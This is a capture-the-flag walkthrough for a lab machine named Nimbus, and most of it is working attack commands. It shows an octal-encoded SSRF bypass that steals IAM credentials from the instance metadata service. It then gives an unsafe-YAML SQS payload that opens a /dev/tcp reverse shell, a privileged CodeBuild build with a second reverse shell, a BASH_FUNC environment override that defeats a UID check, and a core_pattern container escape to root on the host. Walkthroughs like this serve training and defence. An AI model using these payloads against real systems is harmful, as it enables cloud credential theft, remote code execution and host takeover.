Nimbus

Chained exploitation through SSRF → IMDS credential theft → SQS injection with unsafe YAML deserialization → privileged CodeBuild container → core_pattern kernel escape.

Attack Chain Overview

SSRF Octal-encoded IP + .yaml query string bypasses substring denylist on the job URL fetcher
Cred theft IMDS reachable via SSRF → IAM role credentials for nimbus-web-role
SQS injection Stolen role can send to the job queue discovered via sqs list-queues
Worker RCE yaml.load() with unsafe loader + script field passed to python3 -c
Priv esc LocalStack reachable by container IP; privileged CodeBuild project created without front-door IAM
UID bypass Entrypoint trusts id; overridden via BASH_FUNC_id%% env variable
Escape Privileged container writes core_pattern; pipe handler runs on host as root via overlay upperdir bridge

1. Reconnaissance

Initial port scan reveals two services — both patched, no version-CVE path:

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)

Port 80 redirects to a vhost. Add it and enumerate:

curl -v http://<IP>/ 2>&1 | grep -i location
# Location: http://nimbus.htb/

echo "<IP> nimbus.htb" | sudo tee -a /etc/hosts
ffuf -u http://nimbus.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -fc 404

Three endpoints: /, /login, /jobs. Key info leaks from /login: SSO is in migration, the job submitter is unauthenticated, and a user marcus exists.

The healthcheck endpoint is the pivot:

curl -s http://nimbus.htb/api/v1/health
{
  "services": {
    "queue":     { "endpoint": "http://aws.nimbus.htb", "status": "ok" },
    "scheduler": { "endpoint": "http://aws.nimbus.htb" },
    "storage":   { "endpoint": "http://aws.nimbus.htb" }
  },
  "status": "healthy",
  "version": "1.4.2"
}

Reveals the aws.nimbus.htb vhost — a LocalStack-style fake AWS endpoint.

2. SSRF → IMDS Credential Theft

The /jobs/preview URL field has two filters: the URL must contain .yaml/.yml, and the literal string 169.254.169.254 is blocked.

Bypass: write the IMDS IP in octal (0251.0376.0251.0376) and satisfy the YAML extension requirement with a query string.

# First, discover the role name
curl -s -X POST http://nimbus.htb/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml'

# Then pull its creds
curl -s -X POST http://nimbus.htb/jobs/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml'

Response contains AccessKeyId, SecretAccessKey, Token, and Expiration for nimbus-web-role.

3. AWS Enumeration via LocalStack

echo "<IP> aws.nimbus.htb" | sudo tee -a /etc/hosts

export AWS_ACCESS_KEY_ID="<stolen>"
export AWS_SECRET_ACCESS_KEY="<stolen>"
export AWS_SESSION_TOKEN="<stolen>"
export AWS_DEFAULT_REGION="us-east-1"

aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
{ "QueueUrls": ["http://floci:4566/847219365028/nimbus-jobs"] }

The queue URL exposes an internal hostname floci on port 4566 — the actual LocalStack container. The web role can send SQS messages.

4. SQS Injection → Worker RCE

The worker deserializes message bodies with the unsafe yaml.Loader, then runs the script field via python3 -c. Either vector gives execution.

nc -lvnp 4444
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body '!!python/object/apply:os.system ["bash -c \"bash -i >& /dev/tcp/<LHOST>/4444 0>&1\""]'

Worker polls the queue, deserializes, executes → reverse shell as worker. Grab user.txt.

5. Privilege Escalation: Privileged CodeBuild Container

The worker role is denied codebuild:* on the public endpoint, but LocalStack is reachable directly by container IP — without the same IAM restrictions:

python3 -c "import socket; print(socket.gethostbyname('floci'))"
# 172.18.0.2
aws --endpoint-url http://172.18.0.2:4566 codebuild create-project \
  --name pwn \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - bash -i >& /dev/tcp/<LHOST>/4445 0>&1"}' \
  --artifacts '{"type":"NO_ARTIFACTS"}' \
  --environment '{"type":"LINUX_CONTAINER","computeType":"BUILD_GENERAL1_SMALL","image":"floci/floci:latest","privilegedMode":true}' \
  --service-role arn:aws:iam::847219365028:role/nimbus-worker-role

UID-drop bypass: the entrypoint calls id and drops root if UID is 0. Export a bash function that shadows the id binary:

nc -lvnp 4445
aws --endpoint-url http://172.18.0.2:4566 codebuild start-build \
  --project-name pwn \
  --environment-variables-override \
    '[{"name":"BASH_FUNC_id%%","value":"() { echo uid=1000; }","type":"PLAINTEXT"}]'

The entrypoint is fooled, build container stays root, reverse shell connects with full capabilities (CapEff: 000001ffffffffff).

6. Container Escape via core_pattern

A privileged container with CAP_SYS_ADMIN can write /proc/sys/kernel/core_pattern. A pipe-prefixed value runs that program on the host as root on any core dump. The container's overlay upperdir bridges the container filesystem to the host.

# Find the upperdir path
UDIR=$(grep -o 'upperdir=[^,]*' /proc/self/mountinfo | cut -d= -f2)

# Write the handler inside the container (= upperdir on the host)
printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' \
  "$UDIR" "$UDIR" > /x.sh
chmod +x /x.sh

# Point core_pattern at the host-visible path
echo "|${UDIR}/x.sh" > /proc/sys/kernel/core_pattern

# Trigger a core dump
ulimit -c unlimited
sleep 100 & kill -SEGV $!

# Read the flag from the worker shell
cat ${UDIR}/rootflag.txt

Gotchas

  • Upgrade to a real PTY before triggering — bare reverse shells throw tcsetattr errors that break the dump path.
  • The upperdir changes every build — re-read /proc/self/mountinfo in the current container.
  • Write the handler to /x.sh (container path), not directly to ${UDIR}.
  • Add a id > ${UDIR}/proof line when debugging to confirm handler execution.
